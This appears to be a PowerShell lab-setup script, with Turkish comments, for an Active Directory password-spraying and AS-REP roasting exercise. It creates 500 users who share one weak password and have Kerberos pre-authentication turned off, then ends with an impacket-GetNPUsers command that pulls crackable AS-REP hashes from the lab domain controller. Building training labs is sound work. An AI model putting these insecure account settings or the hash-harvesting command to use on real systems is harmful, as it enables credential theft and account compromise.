Import-Module ActiveDirectory

# Lab parolası
$Password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

# Hedef OU
$OU = "OU=PasswordSpray-Lab,DC=lab,DC=local"

# OU yoksa oluştur
if (-not (Get-ADOrganizationalUnit -LDAPFilter "(ou=PasswordSpray-Lab)" -ErrorAction SilentlyContinue)) {
    New-ADOrganizationalUnit `
        -Name "PasswordSpray-Lab" `
        -Path "DC=lab,DC=local"
}

1..500 | ForEach-Object {
    $UserNumber = "{0:D3}" -f $_
    $Sam        = "spray.user$UserNumber"
    $UPN        = "$Sam@lab.local"
    $Name       = "Spray Test User $UserNumber"

    New-ADUser `
        -Name $Name `
        -SamAccountName $Sam `
        -UserPrincipalName $UPN `
        -AccountPassword $Password `
        -Enabled $true `
        -Path $OU `
        -PasswordNeverExpires $true `
        -ChangePasswordAtLogon $false

    # Kerberos pre-authentication disabled
    Set-ADAccountControl `
        -Identity $Sam `
        -DoesNotRequirePreAuth $true
}


Get-ADUser -Filter 'SamAccountName -like "spray.user*"' `
    -Properties DoesNotRequirePreAuth |
    Select-Object Name, SamAccountName, DoesNotRequirePreAuth


impacket-GetNPUsers lab.local/ \
  -usersfile users.txt \
  -no-pass \
  -dc-ip 192.168.39.143 \
  -request \
  -format hashcat \
  -outputfile asrep_hashes.txt



